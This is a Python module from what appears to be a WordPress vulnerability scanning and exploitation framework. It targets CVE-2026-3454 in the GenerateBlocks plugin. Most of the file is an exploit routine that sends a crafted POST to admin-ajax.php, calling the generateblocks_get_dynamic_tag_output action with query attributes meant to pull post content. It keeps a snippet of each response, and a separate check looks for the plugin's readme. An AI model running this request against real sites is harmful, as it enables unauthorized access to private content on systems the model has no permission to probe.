# Made by Sn0w8ird

from __future__ import annotations

from urllib.parse import urlencode

from cpointed.core.engine import ScanResult, Target
from cpointed.core.session import CPointedClient
from cpointed.modules.wordpress.base import WordPressModule


class CVE20263454GenerateBlocks(WordPressModule):
    name = "CVE-2026-3454"
    severity = 6.5
    affected_versions = ["generateblocks: verify against vendor advisory"]
    cwe = "CWE-639 (context-specific)"
    plugin_readme_paths = ("/wp-content/plugins/generateblocks/readme.txt",)
    slug_hint = "generateblocks"

    async def exploit_remote_primitive(
        self,
        target: Target,
        client: CPointedClient,
        *,
        timeout: float,
    ) -> dict:
        """Dynamic tag / block context POST (tune ``attributes`` JSON to your verified PoC)."""
        ajax = self._path(target, "/wp-admin/admin-ajax.php")
        out: dict = {"admin_ajax_posts": []}
        try:
            fields = {
                "action": "generateblocks_get_dynamic_tag_output",
                "tag_name": "generateblocks/query",
                "context": "post",
                "attributes": '{"sourceType":"posts","postId":"1","inherit":false}',
            }
            body = urlencode(fields).encode("utf-8")
            r = await client.request(
                "POST",
                ajax,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                content=body,
                timeout=timeout,
            )
            out["admin_ajax_posts"].append(
                {
                    "path": ajax,
                    "action": fields["action"],
                    "status_code": r.status_code,
                    "body_snippet": (r.text or "")[:2000],
                }
            )
        except Exception as exc:  # pragma: no cover - network
            out["admin_ajax_posts"].append(
                {"action": "generateblocks_get_dynamic_tag_output", "error": str(exc)}
            )
        return out

    async def check(self, target: Target, *, timeout: float = 30.0) -> ScanResult:
        return await self.check_from_readme(target, timeout=timeout)
